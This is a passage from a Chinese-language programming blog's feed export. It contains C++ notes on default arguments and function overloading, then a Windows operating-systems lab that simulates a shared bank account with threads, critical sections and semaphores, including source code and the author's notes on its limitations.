<h5 id="函数的默认参数"><a href="#函数的默认参数" class="headerlink" title="函数的默认参数"></a>函数的默认参数</h5><blockquote>
<ul>
<li><p>当某个参数使用了默认值后，其后面的参数也必须使用默认值，下面是<strong>错误</strong>的示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b=<span class="number">1</span>,<span class="type">int</span> c)</span></span></span><br></pre></td></tr></table></figure>


</li>
<li><p>当函数的声明已经有默认值了，函数的定义就不能有默认值，反过来也一样，下面是<strong>错误</strong>的示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b=<span class="number">1</span>,<span class="type">int</span> c=<span class="number">2</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b=<span class="number">1</span>,<span class="type">int</span> c=<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<h5 id="函数的重载"><a href="#函数的重载" class="headerlink" title="函数的重载"></a>函数的重载</h5><blockquote>
<ul>
<li><p>作用：函数名可以相同，提高复用性</p>
</li>
<li><p>条件</p>
<ul>
<li>同一作用域下</li>
<li>函数名相同</li>
<li>函数参数类型不同或者参数个数不同或者顺序不同</li>
</ul>
</li>
<li><p>注意事项：</p>
<ul>
<li><p>函数返回值不同不能作为重载条件</p>
</li>
<li><p>参数为引用类型时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># include &quot;iostream&quot;</span><br><span class="line"></span><br><span class="line">void func(int &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout&lt;&lt;&quot;func1&quot;&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">void func(const int &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout&lt;&lt;&quot;func1&quot;&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a=9;</span><br><span class="line">    func(a);//func1</span><br><span class="line">    func(9);//func2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p>参数中有默认值时有可能出现二义性，尽量避免，下面就出现了二义性</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b=<span class="number">9</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;func1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;func2&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c=<span class="number">9</span>;</span><br><span class="line">    <span class="built_in">fun</span>(c);<span class="comment">//出现了二义性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>“&quot;c++&quot;</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程与临界区实验</title>
    <url>/2024/10/25/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E4%B8%B4%E7%95%8C%E5%8C%BA%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h5 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h5><blockquote>
<p>Mary和Sally是亲姐妹，她们有一个共同的银行账户，她们可以分别到ATM机取款；爸爸，妈妈，奶奶，爷爷，舅舅也可以分别到ATM机给银行账户存钱。设账户的初始余额为10元。爸爸，妈妈，奶奶，爷爷，舅舅每次分别存入10，20，30，40，50元，每个人分别存款2次。Mary和Sally每次分别取50和100元，每个人分别取款2次。存款和取款的顺序是随机的。假设Mary和Sally的银行账户是可借记的，即当余额少于取款额时，仍旧能够取款成功。利用临界区(Windows系统)或者mutex信号量(Linux系统)编制程序来模拟上述存取款过程，在主程序结束时将账户的最后余额输出</p>
</blockquote>
<blockquote>
<p>思路：</p>
<ul>
<li><p>定义信号量数组：HANDLE array_handel_sema[14] 和 HANDLE array_handel_t[14] ;</p>
</li>
<li><p>创建结构体charactice来存储每个人信息（存款&#x2F;取款，金额，名字等）</p>
</li>
<li><p>使用结构体来THREAD_PARAMS, * PTHREAD_PARAMS来传参</p>
</li>
<li><p>初始化结构体charactice，并创建数组将每个charactice存放进去</p>
</li>
<li><p>获得一个打乱的数组array，数组里面的值为0-6,也是charactice的索引</p>
</li>
<li><p>根据每个人是存款还是取款，创建线程时选择对应的函数</p>
</li>
<li><p>账户余额放在临界区中</p>
</li>
<li><p>每次存款&#x2F;取款线程结束后释放下一个线程</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>源代码：</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line">HANDLE array_handel_sema[<span class="number">14</span>] ;</span><br><span class="line">HANDLE <span class="type">array_handel_t</span>[<span class="number">14</span>] ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	std::string name;</span><br><span class="line">	<span class="type">int</span> index;<span class="comment">//用索引来区分每一个人</span></span><br><span class="line">	<span class="type">int</span> balance;<span class="comment">//表示存/取的钱</span></span><br><span class="line">	<span class="type">int</span> type; <span class="comment">//0表示存钱，1表示取钱</span></span><br><span class="line">&#125;charactice;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="type">int</span>* account;</span><br><span class="line">	charactice charc;	</span><br><span class="line">&#125;THREAD_PARAMS, * PTHREAD_PARAMS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Deposit</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PTHREAD_PARAMS pParams = (PTHREAD_PARAMS)lpParam;</span><br><span class="line">	charactice c = pParams-&gt;charc;</span><br><span class="line">	<span class="type">int</span>* account = pParams-&gt;account;</span><br><span class="line">	<span class="type">int</span> index = pParams-&gt;index;			</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(array_handel_sema[index], INFINITE); <span class="comment">// 等待信号量 sema</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line">	(*account) += c.balance;</span><br><span class="line">	<span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;Transaction &quot;</span> &lt;&lt; index + <span class="number">1</span> &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; c.name &lt;&lt; <span class="string">&quot; deposit &quot;</span> &lt;&lt; c.balance;</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot; current account balance is &quot;</span> &lt;&lt; *account &lt;&lt; std::endl;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (index != <span class="number">13</span>)</span><br><span class="line">	<span class="built_in">ReleaseSemaphore</span>(array_handel_sema[(index + <span class="number">1</span>)], <span class="number">1</span>, <span class="literal">NULL</span>);	<span class="comment">//释放下一个信号量</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">delete</span> pParams; <span class="comment">// 释放动态分配的内存</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Withdraw</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PTHREAD_PARAMS pParams = (PTHREAD_PARAMS)lpParam;</span><br><span class="line">	charactice c = pParams-&gt;charc;</span><br><span class="line">	<span class="type">int</span>* account = pParams-&gt;account;</span><br><span class="line">	<span class="type">int</span> index = pParams-&gt;index;	</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(array_handel_sema[index], INFINITE); <span class="comment">// 等待信号量 sema</span></span><br><span class="line">	<span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line">	(*account) -= c.balance;</span><br><span class="line">	<span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line">	std::cout  &lt;&lt;<span class="string">&quot;Transaction &quot;</span>&lt;&lt;index<span class="number">+1</span>&lt;&lt;<span class="string">&quot;: &quot;</span> &lt;&lt; c.name &lt;&lt; <span class="string">&quot; withdraw &quot;</span> &lt;&lt; c.balance;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;current account balance is &quot;</span> &lt;&lt; *account &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">if</span>(index!=<span class="number">13</span>)</span><br><span class="line">		<span class="built_in">ReleaseSemaphore</span>(array_handel_sema[(index + <span class="number">1</span>)], <span class="number">1</span>, <span class="literal">NULL</span>);	<span class="comment">//释放下一个信号量</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">delete</span> pParams; <span class="comment">// 释放动态分配的内存</span></span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> account = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> array_size = <span class="number">14</span>;</span><br><span class="line">	charactice father = &#123; <span class="string">&quot;father&quot;</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	charactice mother = &#123; <span class="string">&quot;mother&quot;</span>,<span class="number">2</span>,<span class="number">20</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	charactice grandmother = &#123; <span class="string">&quot;grandmother&quot;</span>,<span class="number">3</span>,<span class="number">30</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	charactice grandfather = &#123; <span class="string">&quot;grandfather&quot;</span>,<span class="number">4</span>,<span class="number">40</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	charactice uncle = &#123; <span class="string">&quot;uncle&quot;</span>,<span class="number">5</span>,<span class="number">50</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	charactice Mary = &#123; <span class="string">&quot;Mary&quot;</span>,<span class="number">6</span>,<span class="number">50</span>,<span class="number">1</span> &#125;;</span><br><span class="line">	charactice Sally = &#123; <span class="string">&quot;Sally&quot;</span>,<span class="number">7</span>,<span class="number">100</span>,<span class="number">1</span> &#125;;</span><br><span class="line">	charactice charc[<span class="number">7</span>] = &#123; father ,mother ,grandmother ,grandfather ,uncle ,Mary ,Sally &#125;;</span><br><span class="line">	<span class="built_in">InitializeCriticalSection</span>(&amp;cs);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获得一个打乱的数组,存储1-7，并且每个数字出现两次</span></span><br><span class="line">	<span class="type">int</span> array[<span class="number">14</span>];</span><br><span class="line">	<span class="type">int</span> number[<span class="number">7</span>] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</span><br><span class="line">	<span class="type">int</span>  j, tmp;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		array[i] = number[i % <span class="number">7</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = array_size - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">		j = <span class="built_in">rand</span>() % (array_size);</span><br><span class="line">		tmp = array[i];</span><br><span class="line">		array[i] = array[j];</span><br><span class="line">		array[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化信号量</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			array_handel_sema[i] = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			array_handel_sema[i] = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;Initial account balance is &quot;</span> &lt;&lt; account &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> m = array[i];</span><br><span class="line">		THREAD_PARAMS* arg =<span class="keyword">new</span> THREAD_PARAMS&#123; i,&amp;account,charc[m]&#125;;<span class="comment">//小心数组越界，而且必须动态分配内存</span></span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span> (charc[m].type == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="type">array_handel_t</span> [i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Deposit, arg, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (charc[m].type == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="type">array_handel_t</span>[i] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Withdraw, arg, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">14</span>;i++)</span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(<span class="type">array_handel_t</span>[i], INFINITE);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">		<span class="built_in">CloseHandle</span>(<span class="type">array_handel_t</span>[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">		<span class="built_in">CloseHandle</span>(array_handel_sema[i]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DeleteCriticalSection</span>(&amp;cs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>遇到的问题</strong></p>
<ul>
<li>信号量完全可以用一个全局数组来存储</li>
<li>用做参数的结构体在初始化的时候建议使用动态分配，这样可以在使用完之后释放掉内存</li>
</ul>
</blockquote>
<h5 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h5><blockquote>
<p>要求跟题目一的要求一样，唯一区别是：在本题中假设Mary和Sally的银行账户是不可借记的，即当余额少于取款额时，不能取款，取款线程需要阻塞等待直到账户有足够的钱。</p>
</blockquote>
<blockquote>
<p>思路：在题目一的基础上进行改进</p>
<ul>
<li>定义一个结构体来表示阻塞队列（具体看代码注释），但是阻塞队列需要初始化为全局变量，这样在函数内部才能对其内容进行修改</li>
<li>阻塞队列进行操作比如增删结点时需要在临界区内进行</li>
<li>存款函数：每次取款后都检查一下阻塞队列中的第一个元素（不是队头），看它要取款的金额是否小于账户余额，如果大于，则释放接下来的信号量（比如本次存款等待的信号量为sema5,则释放sema6）；否则，释放取款的信号量，并存储存款接下来的信号量（结点中存储着对应的index）（比如取款等待的信号量为sema2，则释放sema2，并存储sema6）</li>
<li>取款函数：先判断是否能够取钱，能够取款则正常释放下一个信号量，否则加入阻塞队列中，并进行阻塞（比如等待的信号量为sema2，则在将信息加入阻塞队列后再次使用**WaitForSingleObject(array_handel_sema2, INFINITE);**让其停在这里，等到取款函数释放sema2才继续执行下去）</li>
</ul>
</blockquote>
<blockquote>
<p>源代码：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line">HANDLE array_handel_sema[14];</span><br><span class="line">HANDLE array_handel_t[14];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//定义结构体</span><br><span class="line">typedef struct &#123;</span><br><span class="line">	std::string name;</span><br><span class="line">	int index;//用索引来区分每一个人</span><br><span class="line">	int balance;//表示存/取的钱</span><br><span class="line">	int type; //0表示存钱，1表示取钱</span><br><span class="line">&#125;charactice;</span><br><span class="line"></span><br><span class="line">typedef struct queue &#123;</span><br><span class="line">	int flag;//-1表示队头，0表示该节点不是从阻塞队列中取出来的，1表示是从阻塞队列中取出</span><br><span class="line">	int index;//存储索引，-1则是队头</span><br><span class="line">	int index_next;//存储原本没有从阻塞队列中恢复出来节点应该激活的信号量</span><br><span class="line">	charactice* charc;</span><br><span class="line">	queue* next;//指向下一个阻塞结点</span><br><span class="line">&#125;queue, * queue_ptr;                 //应该作为全局变量</span><br><span class="line"></span><br><span class="line">queue_ptr block_queue =new queue &#123; -1,-1,-1,NULL,nullptr &#125;;//初始化阻塞队列，且必须动态分配</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">	int index;</span><br><span class="line">	int* account;</span><br><span class="line">	charactice* charc;	</span><br><span class="line">&#125;THREAD_PARAMS, * PTHREAD_PARAMS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//存钱</span><br><span class="line">void Deposit(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">	PTHREAD_PARAMS pParams = (PTHREAD_PARAMS)lpParam;</span><br><span class="line">	charactice* c = pParams-&gt;charc;</span><br><span class="line">	int* account = pParams-&gt;account;</span><br><span class="line">	int index = pParams-&gt;index;</span><br><span class="line">	</span><br><span class="line">	WaitForSingleObject(array_handel_sema[index], INFINITE); // 等待信号量 sema</span><br><span class="line"></span><br><span class="line">	EnterCriticalSection(&amp;cs);</span><br><span class="line">	(*account) += c-&gt;balance;</span><br><span class="line">	std::cout &lt;&lt; &quot;Transaction &quot; &lt;&lt; &quot;: &quot; &lt;&lt; c-&gt;name &lt;&lt; &quot; deposit &quot; &lt;&lt; c-&gt;balance;</span><br><span class="line">	std::cout &lt;&lt; &quot; current account balance is &quot; &lt;&lt; *account &lt;&lt; std::endl;</span><br><span class="line">	LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	//存完钱后看阻塞队列中的结点能否取钱</span><br><span class="line">	if (block_queue-&gt;next != nullptr)</span><br><span class="line">	&#123;</span><br><span class="line">		if (block_queue-&gt;next-&gt;charc-&gt;balance &lt;= (*account))</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			int i = block_queue-&gt;next-&gt;index;			</span><br><span class="line">			block_queue-&gt;next-&gt;index_next = index+1;</span><br><span class="line">			block_queue-&gt;next-&gt;flag = 1;</span><br><span class="line">			delete pParams; // 释放动态分配的内存</span><br><span class="line">			ReleaseSemaphore(array_handel_sema[i], 1, NULL);	//释放阻塞结点的信号量</span><br><span class="line">			</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (index != 13)</span><br><span class="line">		ReleaseSemaphore(array_handel_sema[(index + 1)], 1, NULL);	//释放下一个信号量</span><br><span class="line"></span><br><span class="line">	delete pParams; // 释放动态分配的内存</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//取钱</span><br><span class="line">void Withdraw(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">	PTHREAD_PARAMS pParams = (PTHREAD_PARAMS)lpParam;</span><br><span class="line">	charactice* c = pParams-&gt;charc;</span><br><span class="line">	int* account = pParams-&gt;account;</span><br><span class="line">	int index = pParams-&gt;index;</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(array_handel_sema[index], INFINITE); // 等待信号量 sema</span><br><span class="line"></span><br><span class="line">	if (*account &lt; c-&gt;balance)//判断能否取钱，不能则加入到阻塞队列</span><br><span class="line">	&#123;</span><br><span class="line">		EnterCriticalSection(&amp;cs);</span><br><span class="line">		std::cout  &lt;&lt; &quot;Transaction &quot; &lt;&lt; &quot;: &quot; &lt;&lt; c-&gt;name &lt;&lt; &quot; want to withdraw &quot; &lt;&lt; c-&gt;balance&lt;&lt;&quot; but account is not enough,waiting...&quot;&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">		queue_ptr tmp_ptr = block_queue;</span><br><span class="line">		queue_ptr tmp =new queue &#123;0, index,-1,c ,nullptr &#125;;</span><br><span class="line">		while (tmp_ptr-&gt;next!=nullptr)//感觉有问题</span><br><span class="line">		&#123;</span><br><span class="line">			tmp_ptr = tmp_ptr-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		tmp_ptr-&gt;next = tmp;</span><br><span class="line">		LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">		if (index != 13)</span><br><span class="line">			ReleaseSemaphore(array_handel_sema[(index + 1)], 1, NULL);	//释放下一个信号量</span><br><span class="line"></span><br><span class="line">		WaitForSingleObject(array_handel_sema[index], INFINITE); // 等待信号量 sema</span><br><span class="line"></span><br><span class="line">		EnterCriticalSection(&amp;cs);</span><br><span class="line">		(*account) -= c-&gt;balance;</span><br><span class="line">		std::cout &lt;&lt; &quot;Transaction &quot; &lt;&lt; &quot;: &quot; &lt;&lt; c-&gt;name &lt;&lt; &quot; withdraw &quot; &lt;&lt; c-&gt;balance;</span><br><span class="line">		std::cout &lt;&lt; &quot; current account balance is &quot; &lt;&lt; *account &lt;&lt; std::endl;</span><br><span class="line">		ReleaseSemaphore(array_handel_sema[block_queue-&gt;next-&gt;index_next], 1, NULL);	//释放下一个信号量</span><br><span class="line">		block_queue-&gt;next = block_queue-&gt;next-&gt;next;//将结点从队列中移除</span><br><span class="line">		LeaveCriticalSection(&amp;cs);</span><br><span class="line">		</span><br><span class="line">		delete pParams; // 释放动态分配的内存</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//既不是阻塞队列中取出来的，余额充足</span><br><span class="line">	EnterCriticalSection(&amp;cs);</span><br><span class="line">	(*account) -= c-&gt;balance;</span><br><span class="line">	std::cout &lt;&lt; &quot;Transaction &quot;  &lt;&lt; &quot;: &quot; &lt;&lt; c-&gt;name &lt;&lt; &quot; withdraw &quot; &lt;&lt; c-&gt;balance;</span><br><span class="line">	std::cout &lt;&lt; &quot; current account balance is &quot; &lt;&lt; *account &lt;&lt; std::endl;</span><br><span class="line">	LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	if (index != 13)</span><br><span class="line">		ReleaseSemaphore(array_handel_sema[(index + 1)], 1, NULL);	//释放下一个信号量</span><br><span class="line"></span><br><span class="line">	delete pParams; // 释放动态分配的内存</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int account = 10;</span><br><span class="line">	int array_size = 14;</span><br><span class="line">	charactice father = &#123; &quot;father&quot;,1,10,0 &#125;;</span><br><span class="line">	charactice mother = &#123; &quot;mother&quot;,2,20,0 &#125;;</span><br><span class="line">	charactice grandmother = &#123; &quot;grandmother&quot;,3,30,0 &#125;;</span><br><span class="line">	charactice grandfather = &#123; &quot;grandfather&quot;,4,40,0 &#125;;</span><br><span class="line">	charactice uncle = &#123; &quot;uncle&quot;,5,50,0 &#125;;</span><br><span class="line">	charactice Mary = &#123; &quot;Mary&quot;,6,50,1 &#125;;</span><br><span class="line">	charactice Sally = &#123; &quot;Sally&quot;,7,100,1 &#125;;</span><br><span class="line">	charactice charc[7] = &#123; father ,mother ,grandmother ,grandfather ,uncle ,Mary ,Sally &#125;;</span><br><span class="line">	InitializeCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	//获得一个打乱的数组,存储1-7，并且每个数字出现两次</span><br><span class="line">	int array[14];</span><br><span class="line">	int number[7] = &#123; 0,1,2,3,4,5,6 &#125;;</span><br><span class="line">	int  j, tmp;</span><br><span class="line">	srand(time(NULL));</span><br><span class="line">	for (int i = 0; i &lt; array_size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		array[i] = number[i % 7];</span><br><span class="line">	&#125;</span><br><span class="line">	for (int i = array_size - 1; i &gt; 0; i--) &#123;</span><br><span class="line">		j = rand() % (array_size);</span><br><span class="line">		tmp = array[i];</span><br><span class="line">		array[i] = array[j];</span><br><span class="line">		array[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	//初始化信号量</span><br><span class="line">	for (int i = 0; i &lt; 14; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (i == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			array_handel_sema[i] = CreateSemaphore(NULL, 1, 1, NULL);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			array_handel_sema[i] = CreateSemaphore(NULL, 0, 1, NULL);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	std::cout &lt;&lt; &quot;Initial account balance is &quot; &lt;&lt; account &lt;&lt; std::endl;</span><br><span class="line">	for (int i = 0; i &lt; 14; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		int m = array[i];</span><br><span class="line">		THREAD_PARAMS* arg = new THREAD_PARAMS&#123; i,&amp;account,&amp;charc[m] &#125;;//小心数组越界，而且必须动态分配内存</span><br><span class="line"></span><br><span class="line">		if (charc[m].type == 0) &#123;</span><br><span class="line">			array_handel_t[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Deposit, arg, 0, NULL);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		if (charc[m].type == 1) &#123;</span><br><span class="line">			array_handel_t[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Withdraw, arg, 0, NULL);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; 14; i++)</span><br><span class="line">		WaitForSingleObject(array_handel_t[i], INFINITE);</span><br><span class="line">	for (int i = 0; i &lt; 14; i++)</span><br><span class="line">		CloseHandle(array_handel_t[i]);</span><br><span class="line">	for (int i = 0; i &lt; 14; i++)</span><br><span class="line">		CloseHandle(array_handel_sema[i]);</span><br><span class="line"></span><br><span class="line">	DeleteCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：因为存款函数每次存款结束后只检查阻塞队列的第一个结点，假如第一第二个结点取款总和小于账户余额，则这种方法存在瑕疵</p>
</blockquote>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>c++</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>操作系统</tag>
      </tags>
